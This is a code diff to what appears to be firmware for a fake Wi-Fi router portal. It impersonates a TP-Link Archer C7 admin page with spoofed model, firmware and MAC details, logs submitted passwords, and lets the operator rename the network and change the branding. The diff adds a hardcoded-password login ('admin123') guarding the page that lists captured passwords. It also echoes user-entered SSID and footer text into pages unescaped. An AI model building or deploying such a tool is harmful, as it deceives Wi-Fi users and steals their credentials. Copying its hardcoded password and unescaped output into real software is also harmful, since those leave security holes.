@@ -30,6 +30,8 @@ String routerVersion = "2.1.4";
 String deviceModel = "Archer C7 v5.0";
 String firmwareVersion = "1.0.3 Build 20200101";
 String macAddress = "74:DA:38:4E:23:AC";
+String adminPassword = "admin123";
+bool isAuthenticated = false;
 
 int initialCheckLocation = 20;
 int passStart = 30;
@@ -68,11 +70,12 @@ String header(String t) {
     ".router-header p { font-size:14px; opacity:0.9; }"
     ".router-content { padding:30px; }"
     ".warning-badge { background:#fff3cd; color:#856404; padding:12px 20px; border-radius:12px; margin-bottom:25px; display:flex; align-items:center; gap:10px; font-size:14px; border-left:4px solid #ffc107; }"
-    ".input-group { margin-bottom:25px; }"
+    ".input-group { margin-bottom:20px; }"
     ".input-group label { display:block; margin-bottom:8px; color:#333; font-weight:500; font-size:14px; }"
-    ".input-group input { width:100%; padding:15px 20px; border:2px solid #e0e0e0; border-radius:12px; font-size:16px; transition:all 0.3s; background:#f8f9fa; }"
+    ".input-group input { width:100%; padding:15px 20px; border:2px solid #e0e0e0; border-radius:12px; font-size:16px; transition:all 0.3s; background:#f8f9fa; margin-bottom:15px; }"
     ".input-group input:focus { outline:none; border-color:#2a5298; background:white; box-shadow:0 0 0 4px rgba(42,82,152,0.1); }"
-    ".btn { background:linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); color:white; border:none; padding:15px 30px; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:all 0.3s; text-transform:uppercase; letter-spacing:1px; }"
+    ".btn { background:linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); color:white; border:none; padding:15px 30px; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:all 0.3s; text-transform:uppercase; letter-spacing:1px; margin-top:10px; }"
+    ".btn-admin { display: inline-block; padding: 12px 30px; background-color: #28a745; color: #fff; border-radius: 4px; text-decoration: none; transition: background-color 0.3s ease; }"
     ".btn:hover { transform:translateY(-2px); box-shadow:0 10px 30px rgba(30,60,114,0.3); }"
     ".status-bar { background:#e8f4fd; padding:15px; border-radius:12px; margin-bottom:25px; display:flex; align-items:center; gap:15px; }"
     ".status-bar .led { width:12px; height:12px; background:#4caf50; border-radius:50%; animation:pulse 2s infinite; }"
@@ -101,7 +104,9 @@ String header(String t) {
     ".btn-clear { background:#dc3545; }"
     ".btn-settings { background:#28a745; }"
     ".btn-footer { background:#ffc107; color:#333; }"
-    ".btn-brand { background:#17a2b8; }";
+    ".btn-brand { background:#17a2b8; }"
+    ".login-container { padding:20px; }"
+    ".lock-icon { font-size:48px; color:#1e3c72; margin-bottom:20px; }";
   
   String h = "<!DOCTYPE html><html><head><title>" + a + " - Router Administration</title>"
     "<meta name=viewport content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
@@ -115,6 +120,40 @@ String header(String t) {
     "<p>Version: " + routerVersion + " | Model: " + routerModel + "</p>"
     "</div><div class='router-content'>";
   return h;
+}
+
+String loginPage() {
+  return header("Admin Login") +
+    "<div class='login-container'>"
+    "<div class='text-center'><i class='fas fa-lock lock-icon'></i></div>"
+    "<div class='warning-badge'><i class='fas fa-shield-alt'></i> Admin Access Required</div>"
+    "<form action=/login method=post class='input-group'>"
+    "<label><i class='fas fa-key' style='margin-right:8px;'></i>Enter Admin Password:</label>"
+    "<input type=password name=p placeholder='Admin password' required>"
+    "<button type=submit class='btn'><i class='fas fa-unlock' style='margin-right:8px;'></i>Login</button>"
+    "</form>"
+    "</div>" + footer();
+}
+
+String handleLogin() {
+  String pass = input("p");
+  if (pass == adminPassword) {
+    isAuthenticated = true;
+    return header("Login Successful") +
+      "<div class='text-center' style='padding:30px;'>"
+      "<i class='fas fa-check-circle' style='font-size:64px; color:#28a745; margin-bottom:20px;'></i>"
+      "<p style='font-size:18px; margin:20px;'>Access granted!</p>"
+      "<a href='/pass' class='btn btn-admin'>Continue to Admin Panel</a>"
+      "</div>" + footer();
+  } else {
+    isAuthenticated = false;
+    return header("Login Failed") +
+      "<div class='text-center' style='padding:30px;'>"
+      "<i class='fas fa-times-circle' style='font-size:64px; color:#dc3545; margin-bottom:20px;'></i>"
+      "<p style='font-size:18px; margin:20px;'>Wrong password!</p>"
+      "<a href='/login' class='btn btn-admin'>Try Again</a>"
+      "</div>" + footer();
+  }
 }
 
 String index() {
@@ -154,6 +193,9 @@ String posted() {
 }
 
 String pass() {
+  if (!isAuthenticated) {
+    return loginPage();
+  }
   return header(PASS_TITLE) + 
     "<div class='password-list'>"
     "<h3 style='margin-bottom:15px; color:#333;'><i class='fas fa-history' style='margin-right:8px;'></i>Recent Activity:</h3>"
@@ -164,10 +206,14 @@ String pass() {
     "<a href='/ssid' class='btn btn-sm btn-settings'><i class='fas fa-edit'></i> Settings</a>"
     "<a href='/footer' class='btn btn-sm btn-footer'><i class='fas fa-certificate'></i> Footer</a>"
     "<a href='/brand' class='btn btn-sm btn-brand'><i class='fas fa-tag'></i> Brand</a>"
+    "<a href='/logout' class='btn btn-sm btn-home'><i class='fas fa-sign-out-alt'></i> Logout</a>"
     "</div>" + footer();
 }
 
 String ssid() {
+  if (!isAuthenticated) {
+    return loginPage();
+  }
   return header("Network Settings") + 
     "<div class='device-info'>"
     "<div><span>Current SSID:</span> " + currentSSID + "</div>"
@@ -182,10 +228,14 @@ String ssid() {
     "</form>"
     "<div class='action-bar'>"
     "<a href='/pass' class='btn btn-sm btn-settings'><i class='fas fa-key'></i> View Passwords</a>"
+    "<a href='/logout' class='btn btn-sm btn-home'><i class='fas fa-sign-out-alt'></i> Logout</a>"
     "</div>" + footer();
 }
 
 String footerPage() {
+  if (!isAuthenticated) {
+    return loginPage();
+  }
   return header("Footer Settings") + 
     "<div class='device-info'>"
     "<div><span>Current Footer:</span> " + footerText + "</div>"
@@ -200,10 +250,14 @@ String footerPage() {
     "<a href='/pass' class='btn btn-sm btn-settings'><i class='fas fa-key'></i> View Passwords</a>"
     "<a href='/ssid' class='btn btn-sm btn-settings'><i class='fas fa-wifi'></i> SSID Settings</a>"
     "<a href='/brand' class='btn btn-sm btn-brand'><i class='fas fa-tag'></i> Brand</a>"
+    "<a href='/logout' class='btn btn-sm btn-home'><i class='fas fa-sign-out-alt'></i> Logout</a>"
     "</div>" + footer();
 }
 
 String brandPage() {
+  if (!isAuthenticated) {
+    return loginPage();
+  }
   String cleanModel = routerModel;
   String cleanVersion = routerVersion;
   String cleanDevice = deviceModel;
@@ -238,10 +292,14 @@ String brandPage() {
     "<a href='/pass' class='btn btn-sm btn-settings'><i class='fas fa-key'></i> View Passwords</a>"
     "<a href='/ssid' class='btn btn-sm btn-settings'><i class='fas fa-wifi'></i> SSID Settings</a>"
     "<a href='/footer' class='btn btn-sm btn-footer'><i class='fas fa-certificate'></i> Footer</a>"
+    "<a href='/logout' class='btn btn-sm btn-home'><i class='fas fa-sign-out-alt'></i> Logout</a>"
     "</div>" + footer();
 }
 
 String postedBrand() {
+  if (!isAuthenticated) {
+    return loginPage();
+  }
   if (webServer.hasArg("rm")) {
     routerModel = webServer.arg("rm");
     routerModel.replace("\0", "");
@@ -286,10 +344,14 @@ String postedBrand() {
     "<div class='text-center' style='padding:30px 0;'>"
     "<i class='fas fa-check-circle' style='font-size:64px; color:#28a745; margin-bottom:20px;'></i>"
     "<p style='font-size:18px; margin-bottom:15px;'>Brand settings updated successfully!</p>"
+    "<a href='/brand' class='btn' style='width:auto; padding:12px 30px;'>Back to Brand Settings</a>"
     "</div>" + footer();
 }
 
 String postedFooter() {
+  if (!isAuthenticated) {
+    return loginPage();
+  }
   String newFooter = input("f");
   newFooter.replace("\0", "");
   footerText = newFooter;
@@ -307,10 +369,14 @@ String postedFooter() {
     "<i class='fas fa-check-circle' style='font-size:64px; color:#28a745; margin-bottom:20px;'></i>"
     "<p style='font-size:18px; margin-bottom:15px;'>Footer has been updated to:</p>"
     "<p style='color:#666; margin-bottom:25px; font-style:italic;'>" + newFooter + "</p>"
+    "<a href='/footer' class='btn' style='width:auto; padding:12px 30px;'>Back to Footer Settings</a>"
     "</div>" + footer();
 }
 
 String postedSSID() {
+  if (!isAuthenticated) {
+    return loginPage();
+  }
   String postedSSID = input("s");
   postedSSID.replace("\0", "");
   currentSSID = postedSSID;
@@ -329,10 +395,14 @@ String postedSSID() {
     "<i class='fas fa-check-circle' style='font-size:64px; color:#28a745; margin-bottom:20px;'></i>"
     "<p style='font-size:18px; margin-bottom:15px;'>SSID has been changed to: <strong>" + postedSSID + "</strong></p>"
     "<p style='color:#666; margin-bottom:25px;'>Please reconnect to the new network.</p>"
+    "<a href='/ssid' class='btn' style='width:auto; padding:12px 30px;'>Back to SSID Settings</a>"
     "</div>" + footer();
 }
 
 String handleSSIDChange() {
+  if (!isAuthenticated) {
+    return loginPage();
+  }
   if (webServer.hasArg("name")) {
     String newSSID = webServer.arg("name");
     newSSID.replace("\0", "");
@@ -348,12 +418,15 @@ String handleSSIDChange() {
     EEPROM.commit();
     WiFi.softAP(newSSID.c_str());
     String msg = "SSID changed to: " + newSSID + "<br>Reconnect to new network.";
-    return header("SSID Updated") + "<div class='text-center' style='padding:30px;'>" + msg + "</div>" + footer();
+    return header("SSID Updated") + "<div class='text-center' style='padding:30px;'>" + msg + "<br><br><a href='/ssid' class='btn'>Back to SSID Settings</a></div>" + footer();
   }
   return header("Error") + "<div class='text-center' style='padding:30px;'>Usage: /ssid?name=NewSSID</div>" + footer();
 }
 
 String clear() {
+  if (!isAuthenticated) {
+    return loginPage();
+  }
   allPass = "";
   passEnd = passStart;
   
@@ -367,6 +440,7 @@ String clear() {
     "<i class='fas fa-check-circle' style='font-size:64px; color:#28a745; margin-bottom:20px;'></i>"
     "<p style='font-size:18px; margin-bottom:15px;'>Logs have been cleared successfully.</p>"
     "<p style='color:#666; margin-bottom:25px;'>No historical data found.</p>"
+    "<a href='/pass' class='btn' style='width:auto; padding:12px 30px;'>Back to Passwords</a>"
     "</div>" + footer();
 }
 
@@ -517,6 +591,24 @@ void setup() {
     webServer.send(HTTP_CODE, "text/html", clear());
   });
   
+  webServer.on("/login", HTTP_GET, []() {
+    webServer.send(HTTP_CODE, "text/html", loginPage());
+  });
+  
+  webServer.on("/login", HTTP_POST, []() {
+    webServer.send(HTTP_CODE, "text/html", handleLogin());
+  });
+  
+  webServer.on("/logout", []() {
+    isAuthenticated = false;
+    webServer.send(HTTP_CODE, "text/html", header("Logged Out") + 
+      "<div class='text-center' style='padding:30px;'>"
+      "<i class='fas fa-sign-out-alt' style='font-size:64px; color:#1e3c72; margin-bottom:20px;'></i>"
+      "<p style='font-size:18px; margin:20px;'>You have been logged out.</p>"
+      "<a href='/login' class='btn btn-admin'>Login Again</a>"
+      "</div>" + footer());
+  });
+  
   webServer.onNotFound([]() {
     lastActivity = millis();
     webServer.send(HTTP_CODE, "text/html", index());
@@ -541,6 +633,9 @@ void setup() {
   Serial.print("Change Brand via: http://");
   Serial.print(WiFi.softAPIP());
   Serial.println("/brand");
+  Serial.print("Admin Login: http://");
+  Serial.print(WiFi.softAPIP());
+  Serial.println("/login");
   Serial.println("================================\n");
 }
 
